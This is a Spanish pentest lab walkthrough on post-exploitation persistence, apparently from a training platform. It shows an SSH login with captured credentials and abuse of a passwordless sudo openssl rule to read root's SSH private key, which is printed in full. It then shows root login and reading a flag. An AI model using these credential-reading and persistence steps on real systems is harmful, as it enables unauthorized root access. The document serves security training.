
# Persistencia Post-Explotación

Ahora que hemos trabajado tanto para conseguir este punto de apoyo, no queremos perderlo. El objetivo es usar este host como punto de apoyo para acceder al resto de la red interna. Nuestro shell aún es relativamente inestable y no queremos seguir configurando el acceso con múltiples pasos para ser lo más eficientes posible y dedicar el máximo tiempo posible a la evaluación, no a manipular los shells.

***

## <mark style="color:purple;">Hundiendo nuestros anzuelos</mark>

Ahora que tenemos las credenciales (`srvadm:ILFreightnixadm!`), podemos aprovechar el puerto SSH que vimos abierto anteriormente y conectarnos para obtener una conexión estable. Esto es importante porque queremos volver lo más cerca posible del mismo punto al inicio de las pruebas cada día, para no perder tiempo en la configuración.&#x20;

Ahora no siempre tendremos SSH abierto a internet y es posible que tengamos que lograr la persistencia de otra manera. Podríamos crear un binario de reverse shell en el host, ejecutarlo mediante la inyección de comandos, obtener un reverse shell o un shell de Meterpreter y luego trabajar con él. Dado que SSH está disponible, lo usaremos. Hay muchas maneras de pivotar y tunelizar nuestro tráfico, que se trataron en profundidad en el módulo [Pivoting, Tunelling y port Forwarding](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/pivoting-tunelling-y-port-forwarding.md) , por lo que vale la pena probar algunas de ellas en esta sección para adquirir más práctica. Necesitaremos usar algunas de ellas a medida que profundicemos en esta red.&#x20;

También es útil tener una forma alternativa de volver a acceder al usar las credenciales de alguien, ya que podrían notar que su cuenta está comprometida o que llega ese momento del mes en que se les solicita cambiar su contraseña, y no podremos volver a conectarnos al día siguiente. Siempre debemos anticiparnos, analizar cada aspecto e intentar anticiparnos a los problemas antes de que surjan. Un laboratorio es muy diferente del mundo real, y no hay reinicios ni segundas oportunidades, por lo que debemos trabajar meticulosamente y mantener el máximo conocimiento de la situación.

```shell-session
afsh4ck@kali$ ssh srvadm@10.129.203.111

The authenticity of host '10.129.203.111 (10.129.203.111)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.203.111' (ECDSA) to the list of known hosts.
srvadm@10.129.203.111's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage

 System information as of Tue 21 Jun 2022 07:30:27 PM UTC

 System load:                      0.31
 Usage of /:                       95.8% of 13.72GB
 Memory usage:                     64%
 Swap usage:                       0%
 Processes:                        458
 Users logged in:                  0
 IPv4 address for br-65c448355ed2: 172.18.0.1
 IPv4 address for docker0:         172.17.0.1
 IPv4 address for ens160:          10.129.203.111
 IPv6 address for ens160:          dead:beef::250:56ff:feb9:d30d
 IPv4 address for ens192:          172.16.8.120

 => / is using 95.8% of 13.72GB

* Super-optimized for small spaces - read how we shrank the memory
  footprint of MicroK8s to make it the smallest full K8s around.

  https://ubuntu.com/blog/microk8s-memory-optimisation

97 updates can be applied immediately.
30 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Wed Jun  1 07:08:59 2022 from 127.0.0.1
$ /bin/bash -i
srvadm@dmz01:~
```

Ahora que tenemos una conexión estable a través de SSH, podemos comenzar a enumerar más.

***

## <mark style="color:purple;">Escalada de privilegios locales</mark>

Podríamos subir un script de enumeración al sistema como [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) , pero siempre intento dos comandos simples después de obtener acceso:

* &#x20;`id` para ver si la cuenta comprometida está en algún grupo local privilegiado.
* &#x20;`sudo -l` para ver si la cuenta tiene algún tipo de privilegios `sudo` para ejecutar comandos como otro usuario o como root.&#x20;

Hasta ahora, hemos practicado muchas técnicas de [escalada de privilegios](/ethical-hacking-cheatsheet/post-explotacion/escalada-de-privilegios.md). Es genial tener estas técnicas en nuestro bolsillo trasero, especialmente si aterrizamos en un sistema muy reforzado. Sin embargo, estamos tratando con administradores humanos, y los humanos cometen errores y también van por conveniencia.&#x20;

La mayoría de las veces, mi camino para escalar privilegios en una máquina Linux durante un pentest no fue un ataque complejo, sino algo simple como un `sudo su` sin una contraseña para obtener privilegios de root o no tener que escalar privilegios porque el servicio que exploté se estaba ejecutando en el contexto de la cuenta root. Es necesario comprender y practicar tantas técnicas como sea posible porque, como hemos dicho algunas veces, cada entorno es diferente y queremos tener el conjunto de herramientas más completo posible a nuestra disposición.

```shell-session
srvadm@dmz01:~$ sudo -l

Matching Defaults entries for srvadm on dmz01:
  env_reset, mail_badpass,
  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User srvadm may run the following commands on dmz01:
  (ALL) NOPASSWD: /usr/bin/openssl
```

Al ejecutar `sudo -l`, vemos que podemos ejecutar el comando `/usr/bin/openssl` como root sin necesidad de contraseña. Como se sospechaba, existe un [GTFOBin](https://gtfobins.github.io/gtfobins/openssl/) para el binario de OpenSSL. La entrada muestra varias maneras de aprovechar esto: para cargar y descargar archivos, obtener una reverse shell, y leer y escribir archivos.&#x20;

{% embed url="<https://gtfobins.github.io/gtfobins/openssl/#file-read>" %}

Probemos esto para ver si podemos obtener la clave privada SSH del usuario root. Esto es ideal en lugar de intentar simplemente leer el archivo `/etc/shadow` u obtener una reverse shell, ya que el archivo `ida_rsa` de clave privada nos permitirá acceder al entorno por SSH como root, lo cual es perfecto para configurar nuestros pivotes.

La entrada indica que podemos utilizar el binario para lecturas de archivos privilegiadas de la siguiente manera:

```shell-session
LFILE=file_to_read
openssl enc -in "$LFILE"
```

Vamos a intentarlo.

```shell-session
srvadm@dmz01:~$ LFILE=/root/.ssh/id_rsa
srvadm@dmz01:~$ sudo openssl enc -in $LFILE

-----BEGIN OPENSSH PRIVATE KEY-----
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
WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----
```

Este archivo siempre lo deberíamos almacenar en notas o en un documento seguro para que podamos utilizarlo para acceder por SSH sin especificar una contraseña.

***

## <mark style="color:purple;">Estableciendo la persistencia</mark>

¡Éxito! Ahora podemos guardar la clave privada en nuestro sistema local, modificar los privilegios y usarla para acceder por SSH como root y confirmar los privilegios.

```shell-session
afsh4ck@kali$ chmod 600 dmz01_key 
afsh4ck@kali$ ssh -i dmz01_key root@10.129.203.111

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 21 Jun 2022 07:53:00 PM UTC

  System load:                      0.04
  Usage of /:                       97.1% of 13.72GB
  Memory usage:                     65%
  Swap usage:                       0%
  Processes:                        472
  Users logged in:                  1
  IPv4 address for br-65c448355ed2: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.129.203.111
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:d30d
  IPv4 address for ens192:          172.16.8.120

  => / is using 97.1% of 13.72GB

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

97 updates can be applied immediately.
30 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


You have mail.
Last login: Tue Jun 21 17:50:13 2022
root@dmz01:~# 
```

Funcionó y ahora estamos dentro y tenemos un "punto de guardado" para regresar al entorno interno rápidamente y podemos usar este acceso SSH para configurar un Port Forwarding y pivotar internamente.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.229.147
```

### Pregunta 1

> Escale los privilegios en el host de destino y envíe el contenido del archivo flag.txt en el directorio /root.

#### Conexión por SSH

```shell-session
afsh4ck@kali$ ssh srvadm@10.129.229.147

The authenticity of host '10.129.229.147 (10.129.229.147)' can't be established.
ED25519 key fingerprint is SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.229.147' (ED25519) to the list of known hosts.
srvadm@10.129.229.147's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

Last login: Wed Jun  1 07:08:59 2022 from 127.0.0.1
$
```

#### Permisos de ejecución

```shell-session
$ sudo -l
Matching Defaults entries for srvadm on dmz01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User srvadm may run the following commands on dmz01:
    (ALL) NOPASSWD: /usr/bin/openssl
```

El usuario srvadm puede ejecutar openssl. Vamos a buscar en GTFO Bins:

{% embed url="<https://gtfobins.github.io/gtfobins/openssl/>" %}

En la sección de `File Write` indica que podemos utilizar el binario para lecturas de archivos privilegiadas de la siguiente manera:

```
LFILE=file_to_write
echo DATA | openssl enc -out "$LFILE"
```

#### Escalada de privilegios con openssl

```shell-session
$ LFILE=/root/.ssh/id_rsa
$ sudo /usr/bin/openssl enc -in $LFILE

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA0ksXgILHRb0j1s3pZH8s/EFYewSeboEi4GkRogdR53GWXep7GJMI
oxuXTaYkMSFG9Clij1X6crkcWLnSLuKI8KS5qXsuNWISt+T1bpvTfmFymDIWNx4efR/Yoa
vpXx+yT/M2X9boHpZHluuR9YiGDMZlr3b4hARkbQAc0l66UD+NB9BjH3q/kL84rRASMZ88
y2jUwmR75Uw/wmZxeVD5E+yJGuWd+ElpoWtDW6zenZf6bqSS2VwLhbrs3zyJAXG1eGsGe6
i7l59D31mLOUUKZxYpsciHflfDyCJ79siXXbsZSp5ZUvBOto6JF20Pny+6T0lovwNCiNEz
7avg7o/77lWsfBVEphtPQbmTZwke1OtgvDqG1v4bDWZqKPAAMxh0XQxscpxI7wGcUZbZeF
9OHCWjY39kBVXObER1uAvXmoJDr74/9+OsEQXoi5pShB7FSvcALlw+DTV6ApHx239O8vhW
/0ZkxEzJjIjtjRMyOcLPttG5zuY1f2FBt2qS1w0VAAAFgIqVwJSKlcCUAAAAB3NzaC1yc2
EAAAGBANJLF4CCx0W9I9bN6WR/LPxBWHsEnm6BIuBpEaIHUedxll3qexiTCKMbl02mJDEh
RvQpYo9V+nK5HFi50i7iiPCkual7LjViErfk9W6b035hcpgyFjceHn0f2KGr6V8fsk/zNl
<----SNIP---->
-----END OPENSSH PRIVATE KEY-----
```

Obtenemos la clave privada `id_rsa` de root! Esta clave debemos almacenarla bien en nuestro equipo para tener siempre un punto de acceso sin contraseña. Lo guardaremos con el nombre del host para identificarlo, en este caso `dmz01_key`.

#### Acceso root

```shell-session
afsh4ck@kali$ chmod 600 dmz01_key                          

afsh4ck@kali$  ssh -i dmz01_key root@10.129.229.147
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 09 Apr 2025 07:12:06 PM UTC
  Last login: Fri Mar  8 09:55:50 2024
                                                                                                                                                                 root@dmz01:~# 
root@dmz01:~# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Acceso a la flag

```shell-session
root@dmz01:~# cd /root
root@dmz01:~# ls
flag.txt  snap
root@dmz01:~# cat flag.txt  
a34985b5976072c3c148************
```
